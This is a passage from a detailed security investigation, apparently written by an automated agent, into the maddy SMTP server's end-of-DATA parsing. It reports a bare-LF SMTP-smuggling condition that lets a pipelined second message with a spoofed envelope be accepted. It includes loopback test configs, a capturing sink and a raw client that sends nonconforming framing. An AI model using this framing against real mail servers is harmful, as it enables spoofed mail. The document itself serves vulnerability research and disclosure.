- maddy `internal/smtpconn/smtpconn.go`: `C.Data` (`:L303`) obtains the wire writer via `c.cl.Data()` (`:L306`), writes the header with `textproto.WriteHeader(wc, hdr)` (`:L311`), then streams the body with `io.Copy(wc, body)` (`:L315`).
- go-smtp `client.go`: `Client.Data` (`:L387`) returns a `dataCloser` wrapping `c.Text.DotWriter()` (`:L392`).
- Go stdlib `net/textproto/writer.go`: `Writer.DotWriter` (`:L43`) returns a `*dotWriter` (`:L55`) whose `Write` (`:L67`) performs the canonical **CRLF re-encoding and dot re-stuffing** on the wire.

So the inbound `dotReader` (Layer 3) *decodes* (CRLF→LF, un-stuff) and this outbound `dotWriter` *re-encodes* (LF→CRLF, re-stuff). That round trip is exactly why, in Q2, the V-A/V-B delivered bodies are byte-identical despite different inbound framing, and why the Q2 V-D leading dots arrive re-stuffed on the wire. **(observed effects; the outbound `file:line` anchors are read from the cited code).**

## 4. RFC 5321 / RFC 5322 and the SMTP-smuggling context

The following standards and advisory facts frame *why* maddy's observed behaviour matters. They are attributed in prose; the inline `file:line` citations elsewhere in this document are reserved for code claims only.

- **RFC 5321 §2.3.8 (Lines).** In SMTP, a "line" is a sequence of characters terminated **only** by `<CRLF>`. Conforming implementations are required not to recognize any other sequence — in particular a bare `<LF>` or a bare `<CR>` — as a line terminator.
- **RFC 5321 §4.1.1.4 (DATA).** The end of mail data is indicated by a line containing only a single period, i.e. the five-character sequence `<CRLF>.<CRLF>`. The standard is explicit that a bare `<LF>.<LF>` sequence **must not** be treated as the end-of-mail-data indication. A strictly conforming receiver therefore treats `<LF>.<LF>` as ordinary body content.
- **RFC 5321 §4.5.2 (Transparency / dot-stuffing).** When a line of mail text begins with a period, the sender doubles it (`.`→`..`); the receiver strips one leading period from any line beginning with a period before the body is stored. This is exactly the un-stuff/re-stuff round trip observed in Q2 V-D.
- **RFC 5322 §2.3.** In a message body, the CR and LF octets are permitted to occur **only together, as CRLF**; they must not appear independently. A bare `<LF>` inside a body is thus non-conformant framing.
- **SMTP smuggling (SEC Consult disclosure, December 2023; Postfix CVE-2023-51764).** A receiver that leniently accepts a bare-LF (or bare-CR) sequence as end-of-data lets an attacker "smuggle" a second message — with a spoofed envelope sender — inside what a conforming peer treats as a single message body, bypassing SPF/DKIM/DMARC alignment on the smuggled message. *(This SPF/DKIM/DMARC-bypass consequence is the disclosure’s described deployment-level impact, attributed to the SEC Consult advisory; it is authentication-policy-dependent and was **not** itself reproduced in this investigation, which did not configure SPF/DKIM/DMARC — see the mapping paragraph below.)* In response, peer MTAs added explicit controls: Postfix introduced `smtpd_forbid_bare_newline` with `normalize` and `reject`-style handling, and fixes shipped in Exim and Sendmail.

**Mapping to maddy (what was demonstrated vs. what is deployment-dependent).** maddy pins `github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c` (a 2019 revision; `go.mod:L19`) and delegates the end-of-`DATA` decision to that library, which in turn delegates it to the Go standard library’s `net/textproto` `dotReader`. As shown in §3 and demonstrated at runtime in Q2/Q3, that FSM accepts **both** canonical `<CRLF>.<CRLF>` and bare-LF `<LF>.<LF>` as terminators (`reader.go:L362-363`). maddy neither overrides this nor layers any bare-newline check on top: the scoped repository search in Q6d for any such control returns nothing (`exit=1`). **What this investigation actually demonstrated (observed)** is the *parser/envelope-level* condition: under a bare-LF `<LF>.<LF>` terminator plus pipelining, maddy begins a **second, independent SMTP transaction** at the smuggled byte boundary and delivers two messages with attacker-chosen `MAIL FROM`/`RCPT` envelopes (Q3), whereas a **named RFC-strict reference receiver** (`strictpeer.py`) fed the *byte-identical* input begins **no** second transaction and delivers exactly **one** message with the smuggled commands retained as body text (Q3, both runs). **What is deployment-dependent (not demonstrated here)** is the downstream SPF/DKIM/DMARC-alignment bypass described by the SMTP-smuggling advisory: those authentication policies were not configured in the canonical test baseline (§5), so their bypass is reported as sourced advisory context, not as a runtime observation of this build. Net: at this revision maddy is in the lenient (smuggling-susceptible) class at the protocol-parsing layer, with **no** normalization or rejection knob — the RFC-conformant `5xx` bare-newline refusal that Postfix et al. added is precisely the behaviour maddy never exhibits.

## 5. Caveats — observed vs inferred, environment, and reproducibility

**Observed vs inferred.** Every behavioural claim tagged **(observed)** is backed by the captured transcript / log / delivered-bytes / error text shown inline together with the exact command that produced it. Claims tagged **(inferred)** are read from the cited code and were not independently instrumented — specifically: the precise internal state-variable transitions of the `dotReader` FSM are inferred from `net/textproto/reader.go` (their *effects* — acceptance, normalization, un-stuffing, `ErrUnexpectedEOF` — are observed); and the `HACKING.md` "body cannot be modified" invariant is a documentation claim, not a runtime measurement (its consequence — maddy never parsing `.` — is corroborated by the fact that maddy only ever receives an already-decoded reader).

**Environment, build, and startup — one chronological transcript (reproducibility).** The single captured transcript below shows, in order and with exact commands, exit statuses, PIDs, and readiness checks: the Go toolchain and module resolution, the git branch/HEAD, the `CGO_ENABLED=1 go build` (exit 0, with the unrelated `mattn/go-sqlite3` cgo notice), the built binary and its version, and the sink + maddy startup with captured PIDs and port-readiness gates. The matching shutdown/port-freedom transcript appears in **Read-only & cleanup** below. **(observed).**

```text
### ENVIRONMENT + BUILD TRANSCRIPT (2026-07-13T18:10:11Z)
$ go version
go version go1.18.10 linux/amd64
$ go env GOROOT GOMODCACHE
/usr/local/go
/go/pkg/mod
$ git rev-parse --abbrev-ref HEAD
blitzy-438524cc-5240-4dd1-904e-f2f199faf5de
$ git rev-parse --short HEAD
2fc2df9
$ git status --porcelain
(exit=0)
$ go list -m github.com/emersion/go-smtp
github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c
$ git log --oneline -1 HEAD^   # parent = maddy source under investigation
26452dd target/remote: Rewrite connection part to allow more concurrency
$ CGO_ENABLED=1 go build -o /tmp/maddy-smtp/maddy ./cmd/maddy
# github.com/mattn/go-sqlite3
sqlite3-binding.c: In function ‘sqlite3SelectNew’:
sqlite3-binding.c:125322:10: warning: function may return address of local variable [-Wreturn-local-addr]
125322 |   return pNew;
       |          ^~~~
sqlite3-binding.c:125282:10: note: declared here
125282 |   Select standin;
       |          ^~~~~~~
(build exit=0, 1783966228s-1783966226s = 2s)
$ ls -l /tmp/maddy-smtp/maddy
-rwxr-xr-x 1 root root 19386576 Jul 13 18:10 /tmp/maddy-smtp/maddy
$ /tmp/maddy-smtp/maddy -v
maddy unknown (built from source tree)
$ python3 sink.py 2526 ... &   (capturing sink)
SINK_PID=90281
port 2526 ready
$ /tmp/maddy-smtp/maddy -config /tmp/maddy-smtp/maddy.conf &
MADDY_PID=90415
port 2525 ready
--- maddy startup log ---
[debug] /tmp/maddy-smtp/maddy.conf:23: new module smtp_downstream [tcp://127.0.0.1:2526]
smtp: I/O debugging is on! It may leak passwords in logs, be careful!
smtp: listening on tcp://127.0.0.1:2525
smtp: 220 test.local ESMTP Service Ready
```

**Confirmed toolchain and paths (this container).**
- `go version` → `go version go1.18.10 linux/amd64` (this is the exact stdlib whose `net/textproto/reader.go` `dotReader` was exercised; the file is `/usr/local/go/src/net/textproto/reader.go`, dated Jan 9 2023).
- `GOROOT` = `/usr/local/go` ; `GOMODCACHE` = `/go/pkg/mod`.
- go-smtp resolved pin: `go list -m github.com/emersion/go-smtp` → `github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c` (matches `go.mod:L19`); cache dir `/go/pkg/mod/github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c`.
- Repository: git branch `blitzy-438524cc-5240-4dd1-904e-f2f199faf5de`, HEAD short `26452dd`. (The **source** branch, per the SWE-AtlasQnA-Repo naming rule, is `maddy_26452dd8dd78`, which is why this document is named `maddy_26452dd8dd78.md`.)

> **Note on the Go version.** The task-analysis notes anticipated a Go 1.21.13 feasibility build; the actual canonical container ships **Go 1.18.10**, so that is the version reported here. The `dotReader` FSM regions cited (`reader.go` L311–408) were re-verified by inspection in this container's 1.18.10 stdlib and are stable across Go 1.13–1.21.

**Exact build and run commands.**
- Build (canonical TEST baseline — see the baseline subsection below): `go build -o /tmp/maddy-smtp/maddy ./cmd/maddy` — exit 0 (only a harmless `mattn/go-sqlite3` cgo compiler notice, from a storage dependency unrelated to the `DATA` path; `CGO_ENABLED=1` is set by `/etc/profile.d/go.sh`).
- Run (canonical): `/tmp/maddy-smtp/maddy -config /tmp/maddy-smtp/maddy.conf` (this build takes configuration via the `-config` flag; there is no `run` subcommand). `io_debug yes` plus a top-level `debug yes` are required for the raw-wire transcript, because `Log.DebugWriter()` returns a discard writer unless debug logging is on.
- Oversize variant (Q6b only, clearly labelled): the same config with `max_message_size 2K` added, run as `/tmp/maddy-smtp/maddy -config /tmp/maddy-smtp/maddy-oversize.conf`; the canonical instance (advertising `SIZE 33554432` = 32 MiB) was restored immediately afterward and re-verified.

**Canonical TEST baseline vs. shipping defaults (precise labelling).** Every experiment (except the explicitly-labelled Q6b oversize variant) ran against one config — `/tmp/maddy-smtp/maddy.conf`, reproduced verbatim in §7.1 — which is a **canonical TEST baseline**, *not* the shipping default `maddy.conf`. It is called a *baseline* (not “default”) because it deviates from a production config in these ways, **each of which is irrelevant to byte-level `DATA` framing** because the terminator decision is made three layers up in the stdlib `dotReader` (§3), before any of these settings is consulted:

| Baseline deviation (`§7.1`) | Why it does **not** affect the `DATA` boundary decision |
|---|---|
| `tls off` (top-level + endpoint) | TLS is a transport wrapper; it changes byte *encryption*, not the line/`.`-terminator parsing performed by `dotReader` on the already-decrypted stream. |
| `debug yes` + `io_debug yes` | Read-only observability only — `io_debug` tees the raw bytes via `io.TeeReader` (`conn.go:L68`); it neither transforms bytes nor alters parsing. |
| `insecure_auth yes`, `defer_sender_reject no` | Affect auth/sender-rejection *policy* at `AUTH`/`MAIL`/`RCPT`, all of which run **before** `DATA`; they never enter the `dotReader` terminator path. |
| Production check rules OMITTED (`require_matching_ehlo`, `require_mx_record`, `verify_dkim`, `apply_spf`, `dmarc`, source/destination reject rules) | These run in the message pipeline at `MAIL`/`RCPT`/post-`DATA` check stages, not inside the end-of-`DATA` state machine; omitting them changes *acceptance policy*, not where the body ends. |
| `deliver_to smtp_downstream` loopback sink (§2526) instead of sql/queue/remote storage | The relay is **downstream** of the accept decision; it only lets us *observe* the decoded-then-re-encoded delivered bytes (§3 outbound chain). |
| Non-standard ports `2525`/`2526` | Port numbers are irrelevant to SMTP line framing. |

**The two knobs that actually govern the boundary are left at their true defaults** in this baseline, and the word *default* is reserved for exactly these: `max_message_size` = the go-smtp/maddy default **32 MiB**, advertised as `SIZE 33554432` and confirmed in every EHLO (`smtp.go:L561`); and `MaxLineLength` = the go-smtp default **2000**, which maddy does not override (`server.go:L76`). The only place a boundary-governing knob was changed is the **Q6b** oversize variant (`/tmp/maddy-smtp/maddy-oversize.conf`, §7.2), which sets `max_message_size 2K`; it is labelled as a configured-limit variant at its use site, and the 32 MiB canonical instance was restored and re-verified immediately afterward (Q6b transcript).

**Run-to-run variation.** None observed. Every experiment was run at least twice; Q4 was additionally run as two independent 5-message batches plus repeated back-to-back transactions. All outcomes were a single stable value (see each Q's "Stability" line).

**Read-only & cleanup.** All observation artifacts (the built binary, `maddy.conf`, the oversize variant, the raw client, the sink, the front proxy, and all captured logs) lived under `/tmp/maddy-smtp/` only; none was added to the repository. On completion the temporary processes were stopped (by captured PID) and every harness port confirmed free; the chronological shutdown transcript is:

```text
===== SHUTDOWN TRANSCRIPT (finding 3: chronological) — 2026-07-13T18:23:42Z =====
stopping maddy PID=98157
stopping sink PID=90281
proxy PID=95231 already stopped
--- port freedom after shutdown ---
port 2524 free
port 2524: FREE
port 2525 free
port 2525: FREE
port 2526 free
port 2526: FREE
port 2527 free
port 2527: FREE
--- confirm no maddy/sink/proxy processes from THIS harness remain (by pidfile) ---
maddy 98157 dead
sink 90281 dead
proxy 95231 dead
strictpeer 92627 dead
```

`/tmp/maddy-smtp/` was then removed, and `git status --porcelain` reported only the single new file (and the new directories that hold it):
```text
?? blitzy/documentation/maddy_26452dd8dd78.md
```
`git diff --stat` against HEAD shows no modification to any existing tracked file.

## 6. Coverage pass — every question and named item, confirmed addressed

**The six sub-questions (each answered by name, with observed output):**

- [x] **Q1 — the boundary-decision moment.** §2 Q1: `354` greeting, terminator consumed → `stateEOF`, `250 OK: queued`, `smtp: accepted {msg_id}` (`smtp.go:L334`), delivered body at sink. (observed)
- [x] **Q2 — framing-variation payloads.** §2 Q2 V-A…V-E: canonical vs bare-LF terminator, bare-LF body lines, dot-stuffing, terminator-resembling lines; V-A≡V-B byte-identical delivery (SHA-256). (observed)
- [x] **Q3 — pipelined pressure vs a stricter peer.** §2 Q3: bare-LF `<LF>.<LF>` + pipelined second block ⇒ **two** delivered messages incl. an attacker-chosen `MAIL FROM`/`RCPT`; a **named RFC-strict reference receiver** (`strictpeer.py`) fed the *byte-identical* input delivered **exactly one** message (smuggled commands retained as body text), both runs. (observed)
- [x] **Q4 — back-to-back stability.** §2 Q4: two independent 5-message batches (10/10 accepted; one identical body SHA-256 `6fafed38…` across the whole delivered corpus, 19×) + 3 back-to-back on one connection with 3 envelope resets, both runs; single stable outcome. (observed)
- [x] **Q5 — a cleaning / blocking front proxy.** §2 Q5 (instrumented proxy — byte/event log, rejection offset, forwarded-prefix; PID/readiness/shutdown): normalize rewrites `<LF>.<LF>`→`<CRLF>.<CRLF>` and **manufactures** the boundary (maddy still 2 delivered); reject shown both packetizations — single-chunk (`forwarded_prefix=0`, maddy sees only `220`, client `500`) and split-chunk (`forwarded_prefix=156`, maddy `EHLO`→`354`→`unexpected EOF`→aborted, `500`); sink `0` in both; canonical-through-reject control passes (`250`). Bounded invariant: bytes at/after the bare-LF are never forwarded. (observed)
- [x] **Q6 — what lingers, and what is expected but never seen.** §2 Q6: dropped-mid-`DATA`→`unexpected EOF`, maddy **attempts** `554` on the dead socket while the closed client observes **no reply**; oversize→`552` (correct binary `/tmp/maddy-smtp/maddy -config …/maddy-oversize.conf`, with stop/port-free/live-diff/start/readiness/restore); over-long line **one-chunk**→`554` (client stays connected, sees `554`+`221`) vs **split-chunk**→**accepted** (value-receiver `curLineLength` reset); cleared message/envelope vs persistent connection/session shown by a post-error same-connection probe (`src_ip …:47100`, no re-EHLO); and the **absence** of any bare-newline `5xx` — the scoped source grep is `exit=1` (the broad `--include=*.md` grep that returns `exit=0` merely matches this document). (observed)

**Named mechanisms (function/method/struct), each cited by `file:line` and shown in §3:**

- [x] `Session.Data` (`smtp.go:L312`) · [x] `prepareBody` (`smtp.go:L283`) · [x] `BufferInMemory` (`memory.go:L27`, called `smtp.go:L298`) · [x] `GenerateReceived` (`received.go:L19`, called `smtp.go:L303`; add `smtp.go:L307`)
- [x] `dotReader` states — `stateBeginLine`/`stateDot`/`stateDotCR`/`stateCR`/`stateData`/`stateEOF` (`reader.go:L327-333`, transitions L346-402)
- [x] `handleData` (`conn.go:L498`) · [x] drain `io.Copy(ioutil.Discard, r)` (`conn.go:L521`) · [x] `Conn.reset` (`conn.go:L694`) · [x] `io.TeeReader`→`Debug` (`conn.go:L68`)
- [x] `newDataReader`→`c.text.DotReader()` (`data.go:L51,L53`) · [x] `Session.abort`/`Session.Reset` (`smtp.go:L60,L67`, `aborted` log L72) · [x] delivery `Body`/`Commit` (`msgpipeline.go:L307,L406`); outbound relay chain (§3, “Layer 1 (outbound)”): `smtp_downstream` `Delivery.Body` L207 / `Commit` L226 → `d.conn.Data` L230 → `smtpconn.C.Data` L303 (`c.cl.Data()` L306, `textproto.WriteHeader` L311, `io.Copy` L315) → go-smtp `Client.Data` L387 → `c.Text.DotWriter()` L392 → stdlib `textproto` `Writer.DotWriter` `writer.go:L43` / `dotWriter.Write` L67 (canonical CRLF re-encode + dot re-stuff)

**Named flags / knobs:**

- [x] `io_debug` (`smtp.go:L565`; enables `serv.Debug` `smtp.go:L603-604`; "I/O debugging is on!" `smtp.go:L605`)
- [x] `max_message_size`→`MaxMessageBytes` (32 MiB default; `smtp.go:L561`) — observed via EHLO `SIZE 33554432` and the Q6b `552`
- [x] `max_recipients`→`MaxRecipients` (20000 default; `smtp.go:L562`)
- [x] `MaxLineLength` (default `2000`; go-smtp `server.go:L76`; not overridden by maddy) — observed via Q6c `too longer line`
- [x] `EnableSMTPUTF8` (`smtp.go:L504`) — observed via `250-SMTPUTF8` in every EHLO

**Files, all three layers:**

- [x] Layer 1 — `internal/endpoint/smtp/smtp.go`, `internal/buffer/memory.go`, `internal/target/received.go`, `internal/msgpipeline/msgpipeline.go`, `internal/target/smtp_downstream/smtp_downstream.go`, `HACKING.md`, `go.mod`, `maddy.conf`
- [x] Layer 2 — go-smtp `conn.go`, `data.go`, `server.go`, `lengthlimit_reader.go`
- [x] Layer 3 — Go stdlib `net/textproto/reader.go`

**User-provided examples (each addressed by name):**

- [x] "CRLF.CRLF vs bare-LF dot" — Q2 V-A vs V-B (and the Q3 trigger).
- [x] "dot-stuffing" — Q2 V-D (RFC 5321 §4.5.2 round trip).
- [x] "cleans up or blocks ambiguous framing" — Q5 normalize (cleans up / manufactures) vs reject (blocks).

---

## 7. Appendix — the temporary `/tmp` harness (verbatim source)

These configs and scripts are the exact **hardened** artifacts that produced every transcript above. The hardening applied (finding: harness safety) is visible inline: the front proxy validates its mode and fails fast on an unknown one, and handles a **bare `<CR>`** as well as a bare `<LF>`; the sink uses a **bounded** accumulation guard (`MAX_MSG_BYTES`) and socket timeouts; the client and sink set socket deadlines and clean up in `finally`. They lived under `/tmp/maddy-smtp/` only (a `0700`-mode directory) and were removed on completion (see §5); all eight artifacts are reproduced verbatim below so the evidence is fully reproducible.

### 7.1 Canonical TEST baseline config — `/tmp/maddy-smtp/maddy.conf`
```text
## Canonical TEST baseline config for the DATA-boundary investigation (temporary; /tmp only).
## Inbound smtp endpoint -> smtp_downstream relay -> capturing Python sink (:2526).
## This is a MINIMAL TEST baseline, NOT the shipping default maddy.conf. It differs from the
## shipping config ONLY in ways that do NOT touch DATA byte framing (see the doc's Caveats):
##   - tls off / debug yes / io_debug yes  (observability + no TLS wrapper on loopback)
##   - insecure_auth yes / defer_sender_reject no  (accept raw test traffic)
##   - production check rules (require_matching_ehlo, require_mx_record, verify_dkim, apply_spf,
##     dmarc, source/destination reject rules) are OMITTED so raw test bytes are accepted.
##   - deliver_to smtp_downstream loopback sink instead of sql/queue/remote storage.
## The two knobs that GOVERN the DATA boundary are LEFT AT THEIR DEFAULTS:
##   max_message_size = 32 MiB (advertised as SIZE 33554432)   MaxLineLength = 2000 (go-smtp default).
hostname test.local
tls off
debug yes

smtp tcp://127.0.0.1:2525 {
    io_debug yes
    hostname test.local
    tls off
    insecure_auth yes
    defer_sender_reject no

    deliver_to smtp_downstream tcp://127.0.0.1:2526 {
        hostname test.local
        attempt_starttls no
        require_tls no
    }
}
```

### 7.2 Oversize variant config (Q6b only, labelled) — `/tmp/maddy-smtp/maddy-oversize.conf`
```text
## Oversize VARIANT config (temporary; /tmp only) — identical to the canonical TEST baseline
## except max_message_size is lowered to 2K (mapped to go-smtp MaxMessageBytes) to trip a 552
## quickly. LABEL: this is a configured-limit variant, NOT the 32 MiB default. It is the ONLY
## experiment in this investigation that changes a DATA-governing knob from its default.
hostname test.local
tls off
debug yes

smtp tcp://127.0.0.1:2525 {
    io_debug yes
    max_message_size 2K
    hostname test.local
    tls off
    insecure_auth yes
    defer_sender_reject no

    deliver_to smtp_downstream tcp://127.0.0.1:2526 {
        hostname test.local
        attempt_starttls no
        require_tls no
    }
}
```

### 7.3 Capturing SMTP sink (raw sockets; `smtpd` is gone in Python 3.12+) — `/tmp/maddy-smtp/sink.py`
```python
#!/usr/bin/env python3
# Capturing SMTP sink (stdlib raw sockets only; smtpd removed in Py3.12+).
# Listens on 127.0.0.1:<port>, speaks minimal ESMTP, and for every DATA message
# records the EXACT delivered bytes (post decode+re-encode produced by maddy's
# smtp_downstream relay via conn.Data) to a per-message .bin file plus a human log.
# Does NOT advertise STARTTLS. Handles multiple transactions per connection.
# Hardening: per-connection socket deadline, bounded read accumulation, bounded
# worker threads, and guaranteed socket cleanup in a finally block.
import socket, socketserver, sys, os, threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 2526
DELIV_DIR = sys.argv[2] if len(sys.argv) > 2 else "/tmp/maddy-smtp/delivered"
HUMAN_LOG = sys.argv[3] if len(sys.argv) > 3 else "/tmp/maddy-smtp/sink_delivered.log"
os.makedirs(DELIV_DIR, exist_ok=True)

MAX_MSG_BYTES = 64 * 1024 * 1024   # bounded accumulation guard (finding 14)
SOCK_TIMEOUT  = 30.0               # per-connection deadline (finding 14)

_seq = [0]
_seq_lock = threading.Lock()

def vis(b: bytes) -> str:
    out = []
    for by in b:
        if by == 0x0d: out.append("<CR>")
        elif by == 0x0a: out.append("<LF>\n")
        elif by == 0x09: out.append("<TAB>")
        elif 32 <= by < 127: out.append(chr(by))
        else: out.append("\\x%02x" % by)
    return "".join(out)

def hexdump(b: bytes) -> str:
    lines = []
    for off in range(0, len(b), 16):
        chunk = b[off:off+16]
        hexpart = " ".join("%02x" % c for c in chunk)
        asc = "".join(chr(c) if 32 <= c < 127 else "." for c in chunk)
        lines.append("%08x  %-47s  |%s|" % (off, hexpart, asc))
    lines.append("%08x" % len(b))
    return "\n".join(lines)

class Handler(socketserver.BaseRequestHandler):
    def send(self, s):
        self.request.sendall(s if isinstance(s, bytes) else s.encode())
    def readline(self, buf):
        while b"\r\n" not in buf[0]:
            if len(buf[0]) > MAX_MSG_BYTES:
                return None
            chunk = self.request.recv(4096)
            if not chunk:
                return None
            buf[0] += chunk
        line, _, rest = buf[0].partition(b"\r\n")
        buf[0] = rest
        return line + b"\r\n"
    def read_data(self, buf):
        # read until canonical <CRLF>.<CRLF> (RFC-strict sink)
        data = b""
        while True:
            if buf[0]:
                data += buf[0]; buf[0] = b""
            if data == b".\r\n" or data.endswith(b"\r\n.\r\n"):
                break
            if len(data) > MAX_MSG_BYTES:
                break
            chunk = self.request.recv(4096)
            if not chunk:
                break
            data += chunk
        if data.endswith(b"\r\n.\r\n"):
            body = data[:-3]
        elif data == b".\r\n":
            body = b""
        else:
            body = data
        # unstuff: any line beginning with '.' has one dot removed (RFC 5321 4.5.2)
        out = bytearray(); i = 0; atbol = True
        while i < len(body):
            c = body[i]
            if atbol and c == 0x2e and i+1 < len(body):
                i += 1; atbol = False; continue
            out.append(c); atbol = (c == 0x0a); i += 1
        return bytes(out), data
    def handle(self):
        peer = "%s:%d" % self.client_address
        try:
            self.request.settimeout(SOCK_TIMEOUT)
            self.send("220 sink.local ESMTP capturing-sink ready\r\n")
            buf = [b""]
            mail_from = None; rcpts = []
            while True:
                line = self.readline(buf)
                if line is None:
                    break
                cmd = line.rstrip(b"\r\n"); up = cmd.upper()
                if up.startswith(b"EHLO"):
                    self.send("250-sink.local greets you\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 0\r\n")
                elif up.startswith(b"HELO"):
                    self.send("250 sink.local\r\n")
                elif up.startswith(b"MAIL FROM"):
                    mail_from = cmd.decode("latin1"); rcpts = []
                    self.send("250 2.1.0 Sender ok\r\n")
                elif up.startswith(b"RCPT TO"):
                    rcpts.append(cmd.decode("latin1"))
                    self.send("250 2.1.5 Recipient ok\r\n")
                elif up.startswith(b"DATA"):
                    self.send("354 End data with <CR><LF>.<CR><LF>\r\n")
                    body, raw = self.read_data(buf)
                    with _seq_lock:
                        _seq[0] += 1; n = _seq[0]
                    fn = os.path.join(DELIV_DIR, "msg-%03d-%d.bin" % (n, os.getpid()))
                    with open(fn, "wb") as f:
                        f.write(body)
                    rec = []
                    rec.append("========== DELIVERED MESSAGE #%d from %s ==========" % (n, peer))
                    rec.append("ENVELOPE %s" % (mail_from or "(none)"))
                    for r in rcpts:
                        rec.append("ENVELOPE %s" % r)
                    rec.append("--- delivered body (unstuffed, %d bytes) visible-control-chars ---" % len(body))
                    rec.append(vis(body))
                    rec.append("--- delivered body hexdump ---")
                    rec.append(hexdump(body))
                    rec.append("--- raw wire bytes received for DATA (incl terminator, %d bytes) ---" % len(raw))
                    rec.append(vis(raw))
                    rec.append("========== END MESSAGE #%d (saved %s) ==========" % (n, fn))
                    block = "\n".join(rec) + "\n"
                    sys.stdout.write(block); sys.stdout.flush()
                    with open(HUMAN_LOG, "a") as lf:
                        lf.write(block); lf.flush()
                    self.send("250 2.0.0 Ok: queued as SINK-%03d\r\n" % n)
                    mail_from = None; rcpts = []
                elif up.startswith(b"RSET"):
                    mail_from = None; rcpts = []; self.send("250 2.0.0 Ok\r\n")
                elif up.startswith(b"NOOP"):
                    self.send("250 2.0.0 Ok\r\n")
                elif up.startswith(b"QUIT"):
                    self.send("221 2.0.0 Bye\r\n"); break
                else:
                    self.send("250 2.0.0 Ok\r\n")
        except (socket.timeout, OSError):
            pass
        finally:
            try: self.request.close()
            except OSError: pass

class Srv(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

if __name__ == "__main__":
    with Srv(("127.0.0.1", PORT), Handler) as s:
        sys.stderr.write("sink listening on 127.0.0.1:%d (delivered->%s)\n" % (PORT, DELIV_DIR)); sys.stderr.flush()
        s.serve_forever()
```

### 7.4 Byte-controlled raw SMTP client — `/tmp/maddy-smtp/rawclient.py`
```python
#!/usr/bin/env python3
# Byte-controlled raw-socket SMTP client (stdlib socket only).
# Full control over \r\n vs bare \n, dot-stuffing, end-of-DATA sequence, and
# pipelining. Prints the COMPLETE client-side transcript with control chars visible.
# Usage: rawclient.py <mode> [host] [port]
# Hardening: connect + per-recv socket timeouts; bounded settle-window reads.
import socket, sys, time

MODE = sys.argv[1] if len(sys.argv) > 1 else "canonical"
HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 2525

CR = b"\r"; LF = b"\n"; CRLF = b"\r\n"

def vis(b: bytes) -> str:
    out = []
    for by in b:
        if by == 0x0d: out.append("<CR>")
        elif by == 0x0a: out.append("<LF>\n")
        elif by == 0x09: out.append("<TAB>")
        elif 32 <= by < 127: out.append(chr(by))
        else: out.append("\\x%02x" % by)
    return "".join(out)

class Client:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(3.0)
    def recv_all(self, label="S->C", settle=0.6):
        self.s.settimeout(settle)
        data = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8 * 1024 * 1024:   # bounded (finding 14)
                    break
        except socket.timeout:
            pass
        if data:
            sys.stdout.write("[%s]\n%s\n" % (label, vis(data))); sys.stdout.flush()
        return data
    def send(self, b: bytes, label="C->S"):
        sys.stdout.write("[%s]\n%s\n" % (label, vis(b))); sys.stdout.flush()
        self.s.sendall(b)
    def send_raw(self, b: bytes, label="C->S"):
        # send without echoing full bytes (for very long payloads); echo a summary
        sys.stdout.write("[%s] (%d bytes)\n" % (label, len(b))); sys.stdout.flush()
        self.s.sendall(b)
    def close(self):
        try: self.s.close()
        except OSError: pass

def canonical(c, term=CRLF):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    body = (b"From: sender@example.com" + CRLF +
            b"To: rcpt@example.com" + CRLF +
            b"Subject: framing probe" + CRLF + CRLF +
            b"BODYLINE-ONE canonical body." + CRLF +
            b"BODYLINE-TWO second line." + CRLF)
    c.send(body, "C->S body")
    c.send(b"." + term, "C->S end-of-DATA terminator")
    c.recv_all("S->C 250?")
    c.send(b"QUIT" + CRLF); c.recv_all()

def barelf(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    body = (b"From: sender@example.com" + LF +
            b"To: rcpt@example.com" + LF +
            b"Subject: framing probe" + LF + LF +
            b"BODYLINE-ONE canonical body." + LF +
            b"BODYLINE-TWO second line." + LF)
    c.send(body, "C->S body (bare-LF lines)")
    c.send(b"." + LF, "C->S end-of-DATA terminator (bare-LF <LF>.<LF>)")
    c.recv_all("S->C 250?")
    c.send(b"QUIT" + CRLF); c.recv_all()

def barelf_body(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    body = (b"From: sender@example.com" + CRLF +
            b"To: rcpt@example.com" + CRLF +
            b"Subject: framing probe" + CRLF + CRLF +
            b"BODYLINE-ONE canonical body." + LF +
            b"BODYLINE-TWO second line." + LF)
    c.send(body, "C->S body (bare-LF body lines)")
    c.send(CRLF + b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C 250?")
    c.send(b"QUIT" + CRLF); c.recv_all()

def dotstuff(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    body = (b"From: sender@example.com" + CRLF +
            b"To: rcpt@example.com" + CRLF +
            b"Subject: framing probe" + CRLF + CRLF +
